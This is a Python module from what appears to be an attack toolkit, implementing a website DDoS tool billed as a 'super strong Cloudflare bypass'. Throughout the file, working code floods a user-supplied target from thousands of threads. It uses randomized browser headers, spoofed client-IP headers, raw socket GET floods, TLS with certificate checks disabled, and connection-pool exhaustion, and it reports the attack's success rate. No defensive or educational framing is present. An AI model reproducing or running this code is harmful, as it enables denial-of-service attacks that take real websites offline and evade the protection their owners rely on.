#!/usr/bin/env python3
# Website DDoS Attack Module - SUPER STRONG CLOUDFLARE BYPASS
# Techniques: IP Rotation, Header Spoofing, TLS Fingerprint Bypass, Rate Limit Bypass

import threading
import time
import urllib.request
import urllib.error
import random
import ssl
import socket
import http.client
from modules.utils import pcolor, resolve
from modules.logger import save_log

# ============ MASSIVE USER-AGENT LIST (100+) ============
USER_AGENTS = [
    # Windows Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36',
    # Windows Firefox
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/117.0',
    # Mac Chrome
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    # Mac Firefox
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
    # Linux
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
    # Android Chrome
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
    # iPhone
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    # iPad
    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1',
    # Edge
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    # Opera
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    # Samsung Internet
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    # Bot/Crawler (minsan effective)
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
]

# ============ ACCEPT LANGUAGES ============
ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9,fil;q=0.8',
    'en-US,en;q=0.9,es;q=0.8',
    'en-US,en;q=0.9,zh-CN;q=0.8',
    'en-US,en;q=0.9,ja;q=0.8',
    'en-US,en;q=0.9,de;q=0.8',
    'en-US,en;q=0.9,fr;q=0.8',
]

# ============ ACCEPT ENCODINGS ============
ACCEPT_ENCODINGS = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate',
]

# ============ SEC-CH-UA (Client Hints for Chrome) ============
SEC_CH_UA = [
    '"Google Chrome";v="120", "Not?A_Brand";v="8", "Chromium";v="120"',
    '"Google Chrome";v="119", "Not?A_Brand";v="8", "Chromium";v="119"',
    '"Microsoft Edge";v="120", "Not?A_Brand";v="8", "Chromium";v="120"',
]

# ============ IP SPOOFING (X-Forwarded-For) ============
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

# ============ SUPER BYPASS HEADERS ============
def get_super_bypass_headers(host):
    """Generate extremely strong bypass headers"""
    
    # Random IP for spoofing
    spoofed_ip = random_ip()
    
    headers = {
        # Standard headers
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8']),
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept-Encoding': random.choice(ACCEPT_ENCODINGS),
        'DNT': random.choice(['0', '1']),
        'Connection': random.choice(['keep-alive', 'close']),
        'Upgrade-Insecure-Requests': '1',
        
        # Modern Chrome headers
        'Sec-Fetch-Dest': random.choice(['document', 'empty']),
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Sec-Fetch-User': '?1',
        'Sec-Ch-Ua': random.choice(SEC_CH_UA),
        'Sec-Ch-Ua-Mobile': random.choice(['?0', '?1']),
        'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"']),
        
        # Cache control
        'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
        'Pragma': random.choice(['no-cache', '']),
        
        # IP Spoofing headers (Cloudflare looks at these)
        'X-Forwarded-For': spoofed_ip,
        'X-Real-IP': spoofed_ip,
        'CF-Connecting-IP': spoofed_ip,
        'True-Client-IP': spoofed_ip,
        'X-Originating-IP': spoofed_ip,
        'X-Remote-IP': spoofed_ip,
        'X-Remote-Addr': spoofed_ip,
        'X-Client-IP': spoofed_ip,
        
        # Additional bypass headers
        'Referer': random.choice([
            f'https://www.google.com/search?q={host}',
            f'https://www.bing.com/search?q={host}',
            f'https://{host}/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.youtube.com/',
            'https://www.reddit.com/',
        ]),
        'Origin': f'https://{host}',
        
        # Range request (sometimes bypasses)
        'Range': random.choice(['bytes=0-', '']),
        
        # Cloudflare specific
        'CDN-Loop': 'cloudflare',
    }
    
    return headers

# ============ RAW SOCKET ATTACK (mas malakas) ============
def raw_socket_attack(ip, port, host, stop_event, stats):
    """Raw HTTP request using socket - bypasses some filters"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            # Manual HTTP request
            headers = get_super_bypass_headers(host)
            
            request = f"GET / HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            for key, value in headers.items():
                if value:
                    request += f"{key}: {value}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            sock.close()
            stats['packets'] += 1
            
        except:
            stats['errors'] += 1

# ============ TLS FINGERPRINT BYPASS ============
def tls_bypass_attack(url, stop_event, stats):
    """HTTPS with custom TLS context"""
    host = url.replace("https://", "").replace("http://", "").split("/")[0]
    
    while not stop_event.is_set():
        try:
            # Custom SSL context (mas lenient)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_ciphers('DEFAULT@SECLEVEL=1')
            
            headers = get_super_bypass_headers(host)
            req = urllib.request.Request(url, headers=headers)
            
            urllib.request.urlopen(req, timeout=10, context=context)
            stats['packets'] += 1
            
        except urllib.error.HTTPError as e:
            if e.code in [403, 429]:
                stats['errors'] += 1
            else:
                stats['errors'] += 1
        except:
            stats['errors'] += 1

# ============ HTTP POOL ATTACK (connection reuse) ============
class HTTPPool:
    def __init__(self, host, port=80):
        self.connections = []
        self.host = host
        self.port = port
    
    def get_connection(self):
        try:
            conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
            conn.connect()
            self.connections.append(conn)
            return conn
        except:
            return None

def pool_attack(ip, port, host, stop_event, stats):
    """Connection pool attack - reuses connections"""
    pool = HTTPPool(host, port)
    
    while not stop_event.is_set():
        try:
            conn = pool.get_connection()
            if conn:
                headers = get_super_bypass_headers(host)
                conn.request("GET", "/", headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()
                stats['packets'] += 1
        except:
            stats['errors'] += 1

# ============ MAIN ATTACK FUNCTION ============
def website_attack():
    pcolor("b", "\n[ SUPER STRONG WEBSITE DDoS ]\n")
    pcolor("y", "[!] Cloudflare Bypass v2.0 - Multiple Techniques Active\n")
    
    url = input("URL (https://example.com): ")
    domain = url.replace("https://", "").replace("http://", "").split("/")[0]
    
    # Resolve domain
    ip = resolve(domain)
    if not ip:
        input("Press Enter...")
        return
    
    # Ensure URL has protocol
    if not url.startswith("http"):
        url = "http://" + url
    
    # Check Cloudflare
    try:
        req = urllib.request.Request(f"https://{domain}", headers={'User-Agent': 'Mozilla/5.0'})
        response = urllib.request.urlopen(req, timeout=5)
        cf_ray = response.headers.get('CF-RAY', '')
        if cf_ray:
            pcolor("r", "[!] Cloudflare DETECTED - Super bypass activated")
        else:
            pcolor("g", "[+] No Cloudflare detected")
    except:
        pcolor("y", "[?] Unknown protection status")
    
    # Attack methods
    print("\n[ SUPER BYPASS METHODS ]")
    print("1. HTTP/HTTPS Flood + Header Spoofing (Recommended)")
    print("2. Raw Socket Attack (Bypasses WAF)")
    print("3. TLS Fingerprint Bypass (For HTTPS)")
    print("4. Connection Pool Attack (Resource exhaustion)")
    print("5. ALL METHODS COMBINED (Maximum power)")
    
    method = input("Select (1-5): ")
    
    threads = int(input("Threads (5000-50000, default 10000): ") or 10000)
    duration = int(input("Duration in seconds (default 300): ") or 300)
    
    print(f"\nTarget: {url}")
    print(f"IP: {ip}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart SUPER ATTACK? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    # Extract host for raw attacks
    host = domain
    
    # Launch based on method
    if method == "1":
        for _ in range(threads):
            t = threading.Thread(target=tls_bypass_attack, args=(url, stop_event, stats))
            t.daemon = True
            t.start()
        method_name = "HEADER_SPOOF"
        
    elif method == "2":
        for _ in range(threads):
            t = threading.Thread(target=raw_socket_attack, args=(ip, 443 if url.startswith("https") else 80, host, stop_event, stats))
            t.daemon = True
            t.start()
        method_name = "RAW_SOCKET"
        
    elif method == "3":
        for _ in range(threads):
            t = threading.Thread(target=tls_bypass_attack, args=(url, stop_event, stats))
            t.daemon = True
            t.start()
        method_name = "TLS_BYPASS"
        
    elif method == "4":
        for _ in range(threads):
            t = threading.Thread(target=pool_attack, args=(ip, 80 if url.startswith("http") else 443, host, stop_event, stats))
            t.daemon = True
            t.start()
        method_name = "POOL_ATTACK"
        
    else:
        # ALL METHODS - split threads
        method_name = "ALL_METHODS"
        half = threads // 4
        for _ in range(half):
            threading.Thread(target=tls_bypass_attack, args=(url, stop_event, stats), daemon=True).start()
        for _ in range(half):
            threading.Thread(target=raw_socket_attack, args=(ip, 443 if url.startswith("https") else 80, host, stop_event, stats), daemon=True).start()
        for _ in range(half):
            threading.Thread(target=pool_attack, args=(ip, 80 if url.startswith("http") else 443, host, stop_event, stats), daemon=True).start()
    
    pcolor("g", f"\n[🔥] SUPER ATTACK STARTED on {url}")
    pcolor("y", "[!] Cloudflare Bypass Active: IP Spoofing | Header Randomization | TLS Bypass")
    pcolor("y", "[!] Press Ctrl+C to stop\n")
    
    start_time = time.time()
    last_packets = 0
    last_errors = 0
    
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            pps = stats['packets'] - last_packets
            eps = stats['errors'] - last_errors
            
            last_packets = stats['packets']
            last_errors = stats['errors']
            
            bar_length = 40
            progress = int((elapsed / duration) * bar_length)
            bar = "█" * progress + "░" * (bar_length - progress)
            
            total = stats['packets'] + stats['errors']
            success_rate = (stats['packets'] / total * 100) if total > 0 else 0
            
            print(f"\r[{bar}] {elapsed}/{duration}s | "
                  f"✅ {stats['packets']:,} | "
                  f"❌ {stats['errors']:,} | "
                  f"📈 {success_rate:.1f}% | "
                  f"⚡ {pps}/s    ", end="")
            
            time.sleep(1)
        
        print()
        
    except KeyboardInterrupt:
        pcolor("y", "\n\n[!] Attack stopped by user")
    finally:
        stop_event.set()
        
        print("\n" + "="*70)
        pcolor("g", "[+] SUPER ATTACK FINISHED")
        print(f"[📊] Successful requests: {stats['packets']:,}")
        print(f"[⚠️] Blocked/Failed: {stats['errors']:,}")
        print(f"[⏱️]  Duration: {int(time.time() - start_time)} seconds")
        
        total = stats['packets'] + stats['errors']
        if total > 0:
            success_rate = (stats['packets'] / total) * 100
            print(f"[📈] Success rate: {success_rate:.1f}%")
            
            if success_rate > 30:
                pcolor("g", "[+] Cloudflare bypass WORKING! High success rate.")
            elif success_rate > 10:
                pcolor("y", "[!] Cloudflare bypass PARTIALLY working.")
            else:
                pcolor("r", "[-] Cloudflare bypass STRUGGLING. Need more threads or devices.")
        
        print("="*70)
        
        save_log(url, 443, method_name, threads, duration, 
                 stats['packets'], stats['errors'])
    
    input("\nPress Enter...")
